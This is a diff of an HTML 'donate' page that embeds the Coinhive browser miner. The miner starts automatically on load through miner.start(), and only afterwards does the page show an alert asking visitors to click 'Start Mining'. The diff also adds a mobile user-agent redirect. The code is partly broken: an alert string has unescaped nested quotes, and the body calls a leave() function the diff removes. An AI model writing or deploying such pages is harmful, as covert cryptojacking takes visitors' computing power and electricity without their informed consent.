@@ -2,15 +2,15 @@
   <head>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	  	<script>var miner = new CoinHive.User('G4OLMrIbZzYBMtSbxXOaXHy1XungWWes', 'GitHub Donate User');
-		  miner.start();
+			miner.start();
 	  </script>
 	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
 	  <script>window.onload = function() {
-  alert("Please click "Start Mining" to start donating...");
+			  alert("Please click "Start Mining" to start donating...");
 }</script>
-	  <script>window.onbeforeunload = leave() {
-    return true;
-};
+	  <script>if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+			  window.location.replace("slaythevirus.github.io/donate/mobile");
+}
 </script>
   </head>
 	<body onload="leave()">
